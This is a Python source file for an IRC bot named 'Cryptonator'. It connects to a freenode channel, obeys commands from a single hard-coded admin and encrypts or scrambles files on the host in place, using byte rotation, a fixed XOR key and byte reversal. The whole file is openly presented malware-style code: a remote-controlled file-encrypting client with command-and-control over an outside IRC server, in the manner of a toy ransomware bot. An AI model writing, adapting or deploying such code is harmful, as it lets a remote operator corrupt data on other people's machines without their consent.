#!/usr/bin/python3

import os.path
import socket
import string
import random

class Cryptonator:

    def __init__(self):

        # Generate a random botnick
        self.nick = 'CRYPTONATOR-' + ''.join(random.choice(string.ascii_uppercase
            + string.digits) for _ in range(5))

        # Linked admin name
        self.admin = 'jazpy'

        # Linked IRC info
        self.server = 'weber.freenode.net'
        self.channel = '#Jazpy'

        # Connection variables
        self.irc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = 6667

    #############
    # IRC FUNCS #
    #############

    def connect(self):

        # Connect to server
        self.irc_sock.connect((self.server, self.port))
        self.irc_sock.send(bytes('NICK ' + self.nick + '\r\n', 'UTF-8'))
        self.irc_sock.send(bytes('USER ' + self.nick + ' 8 * :' + self.nick
            + '\r\n', 'UTF-8'))

        # Join a channel
        self.irc_sock.send(bytes('JOIN ' + self.channel + '\n', 'UTF-8'))

        # Read all server messages
        msg = ''
        while 'End of /NAMES list.' not in msg:
            msg = self.irc_sock.recv(2048).decode('UTF-8')
            msg = msg.strip('\n\r')

            # Output for diagnostics
            print(msg)

        return 0

    def ping(self):
        self.irc_sock.send(bytes('PONG :pingis\n', 'UTF-8'))

        return 0

    def tell(self, text):
        self.irc_sock.send(bytes('PRIVMSG ' + self.channel + ' :' + text 
            + '\n', 'UTF-8'))

        return 1

    def exit(self):
        self.irc_sock.send(bytes("QUIT \n", "UTF-8"))

        return 2

    #############
    # AUX FUNCS #
    #############

    # Auxiliary functions for all_byte_rot
    def rotate_left(self, byte):
        leftmost = 1 if (byte & 128) > 0 else 0
        ret = byte << 1
        ret |= leftmost

        return ret & 255

    def rotate_right(self, byte):
        rightmost = byte & 1
        ret = byte >> 1
        
        if rightmost > 0:
            ret |= 128

        return ret & 255

    ################
    # CRYPTO FUNCS #
    ################

    # Simple ceasar cipher
    def bin_rot(self, path, encrypt=True):

        # Read file's bytes
        f_bytes = []
        with open(path, 'rb') as f:
            f_bytes = f.read()

        # Rotate in appropriate direction
        displacement = 2 if encrypt else -2

        # Rotate bytes
        f_bytes = f_bytes[displacement:] + f_bytes[:displacement]

        # Output to same filepath
        with open(path, 'wb') as f:
            f.write(f_bytes)
    
    # Simple byte per byte ceasar
    def byte_rot(self, path, encrypt=True):

        # Read file's bytes
        f_bytes = []
        with open(path, 'rb') as f:
            f_bytes = f.read()

        # Rotate bytes
        f_bytes_list = list(f_bytes)
        for i, byte in enumerate(f_bytes_list):
            
            if encrypt:
                f_bytes_list[i] = self.rotate_left(byte)
            else:
                f_bytes_list[i] = self.rotate_right(byte)

        # Output to same filepath
        with open(path, 'wb') as f:
            f.write(bytes(f_bytes_list))

    # Encrypts xorwise with hardcoded key,
    # since xor is symmetrical, there is no
    # encrypt / decrypt parameter
    def byte_xor(self, path):

        # Read file's bytes
        f_bytes = []
        with open(path, 'rb') as f:
            f_bytes = f.read()

        # Rotate bytes
        f_bytes_list = list(f_bytes)
        for i, byte in enumerate(f_bytes_list):
            
            # Encrypt / decrypt with XOR
            f_bytes_list[i] ^= 185

        # Output to same filepath
        with open(path, 'wb') as f:
            f.write(bytes(f_bytes_list))

    # Combines bytewise rotation and xor cipher
    def byte_rot_xor(self, path, encrypt=True):

        if encrypt:
            self.byte_rot(path)
            self.byte_xor(path)
        else:
            self.byte_xor(path)
            self.byte_rot(path, encrypt)

    # Reverses binary, this is also symmetrical
    # so no encrypt / decrypt parameter
    def invert(self, path):

        # Read file's bytes
        f_bytes = []
        with open(path, 'rb') as f:
            f_bytes = f.read()

        # Invert bytes
        f_bytes = f_bytes[::-1]

        # Output to same filepath
        with open(path, 'wb') as f:
            f.write(f_bytes)

    def eval(self):
        
        # Get current message
        msg = self.irc_sock.recv(2048).decode('UTF-8')
        msg = msg.strip('\n\r')

        # Special case for server pings
        if 'PING :' in msg:
            return self.ping()

        # Else it's a PRIVMSG, extract name and text
        if 'PRIVMSG' not in msg:
            return 0

        sender = msg.split('!', 1)[0][1:].lower()
        text = msg.split('PRIVMSG',1)[1].split(':',1)[1].lower()

        # Validate sender before replying
        if len(sender) > 16 or sender != self.admin:
            return 0
        
        # Choose what action to take
        if 'hello' in text:
            return self.tell('World!')

        elif 'file:' in text:
            command = text.split(' file:')[0]
            path = text.split(' file:')[1]

            if not os.path.isfile(path):
                return self.tell('FILE DOES NOT EXIST')

            if command == 'binrot encrypt':
                self.bin_rot(path)
            elif command == 'binrot decrypt':
                self.bin_rot(path, False)
            elif command == 'byterot encrypt':
                self.byte_rot(path)
            elif command == 'byterot decrypt':
                self.byte_rot(path, False)
            elif command == 'bytexor':
                self.byte_xor(path)
            elif command == 'invert':
                self.invert(path)
            elif command == 'byterotxor encrypt':
                self.byte_rot_xor(path)
            elif command == 'byterotxor decrypt':
                self.byte_rot_xor(path, False)

        elif 'exit' in text:
            return self.exit()

        return 0

def main():
    bot = Cryptonator()

    # Connect to chat
    bot_status = bot.connect()

    # Main loop
    while bot_status != 2:
        bot_status = bot.eval()

if __name__ == '__main__':
    main()
